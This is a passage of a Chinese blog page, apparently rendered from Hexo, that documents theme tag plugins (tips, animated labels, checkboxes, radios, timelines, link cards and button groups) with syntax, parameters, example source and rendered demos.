data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip [参数，可选] %&#125;文本内容&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>样式</code>: success,error,warning,bolt,ban,home,sync,cogs,key,bell</li><li><code>自定义图标</code>: 支持fontawesome。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip %&#125;default&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip info %&#125;info&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip success %&#125;success&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip error %&#125;error&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip warning %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip bolt %&#125;bolt&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban %&#125;ban&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip home %&#125;home&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip sync %&#125;sync&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip cogs %&#125;cogs&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip key %&#125;key&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip bell %&#125;bell&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip fa-atom %&#125;自定义font awesome图标&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class="tip "><p>default</p></div><div class="tip info"><p>info</p></div><div class="tip success"><p>success</p></div><div class="tip error"><p>error</p></div><div class="tip warning"><p>warning</p></div><div class="tip bolt"><p>bolt</p></div><div class="tip ban"><p>ban</p></div><div class="tip home"><p>home</p></div><div class="tip sync"><p>sync</p></div><div class="tip cogs"><p>cogs</p></div><div class="tip key"><p>key</p></div><div class="tip bell"><p>bell</p></div><div class="tip fa-atom"><p>自定义font awesome图标</p></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-6-动态标签-anima">2.6 动态标签 anima</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip [参数，可选] %&#125;文本内容&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><div class="note info flat"><ol><li>将所需的CSS类添加到图标（或DOM中的任何元素）。</li><li>对于父级悬停样式，需要给目标元素添加指定CSS类，同时还要给目标元素的父级元素添加CSS类<code>faa-parent animated-hover</code>。（详情见示例及示例源码）<br>You can regulate the speed of the animation by adding the CSS class or . faa-fastfaa-slow</li><li>可以通过给目标元素添加CSS类<code>faa-fast</code>或<code>faa-slow</code>来控制动画快慢。</li></ol></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.On DOM load（当页面加载时显示动画）</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-horizontal animated %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-flash animated %&#125;ban&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><p>2.调整动画速度</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-horizontal animated faa-fast %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-flash animated faa-slow %&#125;ban&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><p>3.On hover（当鼠标悬停时显示动画）</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-horizontal animated-hover %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-flash animated-hover %&#125;ban&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><p>4.On parent hover（当鼠标悬停在父级元素时显示动画）</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-parent animated-hover %&#125;<span class="language-xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;faa-horizontal&quot;</span>&gt;</span></span>warning<span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span>&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-parent animated-hover %&#125;<span class="language-xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;faa-flash&quot;</span>&gt;</span></span>ban<span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span>&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.On DOM load（当页面加载时显示动画）</p><div class="tip warning faa-horizontal animated"><p>warning</p></div><div class="tip ban faa-flash animated"><p>ban</p></div>2.调整动画速度<div class="tip warning faa-horizontal animated faa-fast"><p>warning</p></div><div class="tip ban faa-flash animated faa-slow"><p>ban</p></div>3.On hover（当鼠标悬停时显示动画）<div class="tip warning faa-horizontal animated-hover"><p>warning</p></div><div class="tip ban faa-flash animated-hover"><p>ban</p></div>4.On parent hover（当鼠标悬停在父级元素时显示动画）<div class="tip warning faa-parent animated-hover"><p class="faa-horizontal">warning</p></div><div class="tip ban faa-parent animated-hover"><p class="faa-flash">ban</p></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-7-复选列表-checkbox">2.7 复选列表 checkbox</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% checkbox 样式参数（可选）, 文本（支持简单md） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>样式</code>: plus, minus, times</li><li><code>颜色</code>: red,yellow,green,cyan,blue,gray</li><li><code>选中状态</code>: checked</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% checkbox 纯文本测试 %&#125;</span><br><span class="line">&#123;% checkbox checked, 支持简单的 [<span class="string">markdown</span>](<span class="link">https://guides.github.com/features/mastering-markdown/</span>) 语法 %&#125;</span><br><span class="line">&#123;% checkbox red, 支持自定义颜色 %&#125;</span><br><span class="line">&#123;% checkbox green checked, 绿色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox yellow checked, 黄色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox cyan checked, 青色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox blue checked, 蓝色 + 默认选中 %&#125;</span><br><span class="line">&#123;% checkbox plus green checked, 增加 %&#125;</span><br><span class="line">&#123;% checkbox minus yellow checked, 减少 %&#125;</span><br><span class="line">&#123;% checkbox times red checked, 叉 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class='checkbox'><input type="checkbox" />            <p>纯文本测试</p>            </div><div class='checkbox checked'><input type="checkbox" checked="checked"/>            <p>支持简单的 <a href="https://guides.github.com/features/mastering-markdown/">markdown</a> 语法</p>            </div><div class='checkbox red'><input type="checkbox" />            <p>支持自定义颜色</p>            </div><div class='checkbox green checked'><input type="checkbox" checked="checked"/>            <p>绿色 + 默认选中</p>            </div><div class='checkbox yellow checked'><input type="checkbox" checked="checked"/>            <p>黄色 + 默认选中</p>            </div><div class='checkbox cyan checked'><input type="checkbox" checked="checked"/>            <p>青色 + 默认选中</p>            </div><div class='checkbox blue checked'><input type="checkbox" checked="checked"/>            <p>蓝色 + 默认选中</p>            </div><div class='checkbox plus green checked'><input type="checkbox" checked="checked"/>            <p>增加</p>            </div><div class='checkbox minus yellow checked'><input type="checkbox" checked="checked"/>            <p>减少</p>            </div><div class='checkbox times red checked'><input type="checkbox" checked="checked"/>            <p>叉</p>            </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-8-单选列表-radio">2.8 单选列表 radio</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% radio 样式参数（可选）, 文本（支持简单md） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>颜色</code>: red,yellow,green,cyan,blue,gray</li><li><code>选中状态</code>: checked</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% radio 纯文本测试 %&#125;</span><br><span class="line">&#123;% radio checked, 支持简单的 [<span class="string">markdown</span>](<span class="link">https://guides.github.com/features/mastering-markdown/</span>) 语法 %&#125;</span><br><span class="line">&#123;% radio red, 支持自定义颜色 %&#125;</span><br><span class="line">&#123;% radio green, 绿色 %&#125;</span><br><span class="line">&#123;% radio yellow, 黄色 %&#125;</span><br><span class="line">&#123;% radio cyan, 青色 %&#125;</span><br><span class="line">&#123;% radio blue, 蓝色 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class='checkbox'><input type="radio" />            <p>纯文本测试</p>            </div><div class='checkbox checked'><input type="radio" checked="checked"/>            <p>支持简单的 <a href="https://guides.github.com/features/mastering-markdown/">markdown</a> 语法</p>            </div><div class='checkbox red'><input type="radio" />            <p>支持自定义颜色</p>            </div><div class='checkbox green'><input type="radio" />            <p>绿色</p>            </div><div class='checkbox yellow'><input type="radio" />            <p>黄色</p>            </div><div class='checkbox cyan'><input type="radio" />            <p>青色</p>            </div><div class='checkbox blue'><input type="radio" />            <p>蓝色</p>            </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-9-时间轴-timeline">2.9 时间轴 timeline</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">配置参数</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;% timeline 时间线标题（可选）[,color] %&#125;</span><br><span class="line">&lt;!-- timeline 时间节点（标题） --&gt;</span><br><span class="line">正文内容</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&lt;!-- timeline 时间节点（标题） --&gt;</span><br><span class="line">正文内容</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li><code>title</code>:标题/时间线</li><li><code>color</code>:<code>timeline</code>颜色:default(留空) / blue / pink / red / purple / orange / green</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;% timeline 时间轴样式,blue %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 2020-07-24 [<span class="string">2.6.6 -&gt; 3.0</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases</span>) --&gt;</span><br><span class="line"></span><br><span class="line"><span class="bullet">1.</span> 如果有 <span class="code">`hexo-lazyload-image`</span> 插件，需要删除并重新安装最新版本，设置 <span class="code">`lazyload.isSPA: true`</span>。</span><br><span class="line"><span class="bullet">2.</span> 2.x 版本的 css 和 js 不适用于 3.x 版本，如果使用了 <span class="code">`use_cdn: true`</span> 则需要删除。</span><br><span class="line"><span class="bullet">3.</span> 2.x 版本的 fancybox 标签在 3.x 版本中被重命名为 gallery 。</span><br><span class="line"><span class="bullet">4.</span> 2.x 版本的置顶 <span class="code">`top: true`</span> 改为了 <span class="code">`pin: true`</span>，并且同样适用于 <span class="code">`layout: page`</span> 的页面。</span><br><span class="line"><span class="bullet">5.</span> 如果使用了 <span class="code">`hexo-offline`</span> 插件，建议卸载，3.0 版本默认开启了 pjax 服务。</span><br><span class="line"></span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 2020-05-15 [<span class="string">2.6.3 -&gt; 2.6.6</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.6</span>) --&gt;</span><br><span class="line"></span><br><span class="line">不需要额外处理。</span><br><span class="line"></span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 2020-04-20 [<span class="string">2.6.2 -&gt; 2.6.3</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.3</span>) --&gt;</span><br><span class="line"></span><br><span class="line"><span class="bullet">1.</span> 全局搜索 <span class="code">`seotitle`</span> 并替换为 <span class="code">`seo_title`</span>。</span><br><span class="line"><span class="bullet">2.</span> group 组件的索引规则有变，使用 group 组件的文章内，<span class="code">`group: group_name`</span> 对应的组件名必须是 <span class="code">`group_name`</span>。</span><br><span class="line"><span class="bullet">2.</span> group 组件的列表名优先显示文章的 <span class="code">`short_title`</span> 其次是 <span class="code">`title`</span>。</span><br><span class="line"></span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class="timeline blue"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>时间轴样式</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2020-07-24 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases">2.6.6 -&gt; 3.0</a></p></div></div><div class='timeline-item-content'><ol><li>如果有 <code>hexo-lazyload-image</code> 插件，需要删除并重新安装最新版本，设置 <code>lazyload.isSPA: true</code>。</li><li>2.x 版本的 css 和 js 不适用于 3.x 版本，如果使用了 <code>use_cdn: true</code> 则需要删除。</li><li>2.x 版本的 fancybox 标签在 3.x 版本中被重命名为 gallery 。</li><li>2.x 版本的置顶 <code>top: true</code> 改为了 <code>pin: true</code>，并且同样适用于 <code>layout: page</code> 的页面。</li><li>如果使用了 <code>hexo-offline</code> 插件，建议卸载，3.0 版本默认开启了 pjax 服务。</li></ol></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2020-05-15 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.6">2.6.3 -&gt; 2.6.6</a></p></div></div><div class='timeline-item-content'><p>不需要额外处理。</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>2020-04-20 <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.3">2.6.2 -&gt; 2.6.3</a></p></div></div><div class='timeline-item-content'><ol><li>全局搜索 <code>seotitle</code> 并替换为 <code>seo_title</code>。</li><li>group 组件的索引规则有变，使用 group 组件的文章内，<code>group: group_name</code> 对应的组件名必须是 <code>group_name</code>。</li><li>group 组件的列表名优先显示文章的 <code>short_title</code> 其次是 <code>title</code>。</li></ol></div></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-10-链接卡片-link">2.10 链接卡片 link</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-3">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% link 标题, 链接, 图片链接（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% link 糖果屋教程贴, https://akilar.top/posts/615e2dec/, https://cdn.cbd.int/akilar-candyassets@1.0.36/image/siteicon/favicon.ico %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><div class="tag link"><a class="link-card" title="糖果屋教程贴" href="https://akilar.top/posts/615e2dec/"><div class="left"><img src="https://cdn.cbd.int/akilar-candyassets@1.0.36/image/siteicon/favicon.ico"/></div><div class="right"><p class="text">糖果屋教程贴</p><p class="url">https://akilar.top/posts/615e2dec/</p></div></a></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-11-按钮-btns">2.11 按钮 btns</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns 样式参数 %&#125;</span><br><span class="line">&#123;% cell 标题, 链接, 图片或者图标 %&#125;</span><br><span class="line">&#123;% cell 标题, 链接, 图片或者图标 %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li>圆角样式：rounded, circle</li><li>增加文字样式：可以在容器内增加 <code>&lt;b&gt;</code>标题<code>&lt;/b&gt;</code>和<code>&lt;p&gt;</code>描述文字<code>&lt;/p&gt;</code></li><li>布局方式：<br>默认为自动宽度，适合视野内只有一两个的情况。</li></ol><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>wide</td><td>宽一点的按钮</td></tr><tr><td>fill</td><td>填充布局，自动铺满至少一行，多了会换行</td></tr><tr><td>center</td><td>居中，按钮之间是固定间距</td></tr><tr><td>around</td><td>居中分散</td></tr><tr><td>grid2</td><td>等宽最多2列，屏幕变窄会适当减少列数</td></tr><tr><td>grid3</td><td>等宽最多3列，屏幕变窄会适当减少列数</td></tr><tr><td>grid4</td><td>等宽最多4列，屏幕变窄会适当减少列数</td></tr><tr><td>grid5</td><td>等宽最多5列，屏幕变窄会适当减少列数</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><p>1.如果需要显示类似「团队成员」之类的一组含有头像的链接</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns circle grid5 %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% cell xaoxuu, https://xaoxuu.com, https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><p>2.或者含有图标的按钮</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns rounded grid5 %&#125;</span><br><span class="line">&#123;% cell 下载源码, /, fas fa-download %&#125;</span><br><span class="line">&#123;% cell 查看文档, /, fas fa-book-open %&#125;</span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><p>3.圆形图标 + 标题 + 描述 + 图片 + 网格5列 + 居中</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;% btns circle center grid5 %&#125;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;https://apps.apple.com/cn/app/heart-mate-pro-hrm-utility/id1463348922?ls=1&#x27;</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&#x27;fab fa-apple&#x27;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">b</span>&gt;</span></span>心率管家<span class="language-xml"><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span></span><br><span class="line">  &#123;% p red, 专业版 %&#125;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_pro.png&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;https://apps.apple.com/cn/app/heart-mate-lite-hrm-utility/id1475747930?ls=1&#x27;</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&#x27;fab fa-apple&#x27;</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">b</span>&gt;</span></span>心率管家<span class="language-xml"><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span></span><br><span class="line">  &#123;% p green, 免费版 %&#125;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_lite.png&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line">&#123;% endbtns %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><p>1.如果需要显示类似「团队成员」之类的一组含有头像的链接</p><div class="btns circle grid5">            <a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a><a class="button" href='https://xaoxuu.com' title='xaoxuu'><img src='https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/avatar/avatar.png'>xaoxuu</a>          </div>2.或者含有图标的按钮<div class="btns rounded grid5">            <a class="button" href='/' title='下载源码'><i class='fas fa-download'></i>下载源码</a><a class="button" href='/' title='查看文档'><i class='fas fa-book-open'></i>查看文档</a>          </div>3.圆形图标 + 标题 + 描述 + 图片 + 网格5列 + 居中<div class="btns circle center grid5">            <a href='https://apps.apple.com/cn/app/heart-mate-pro-hrm-utility/id1463348922?ls=1'>  <i class='fab fa-apple'></i>  <b>心率管家</b>  <p class='p red'>专业版</p>  <img src='https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_pro.png'></a><a href='https://apps.apple.com/cn/app/heart-mate-lite-hrm-utility/id1475747930?ls=1'>  <i class='fab fa-apple'></i>  <b>心率管家</b>  <p class='p green'>免费版</p>  <img src='https://cdn.jsdelivr.net/gh/fomalhaut1998/cdn-assets/qrcode/heartmate_lite.png'></a>          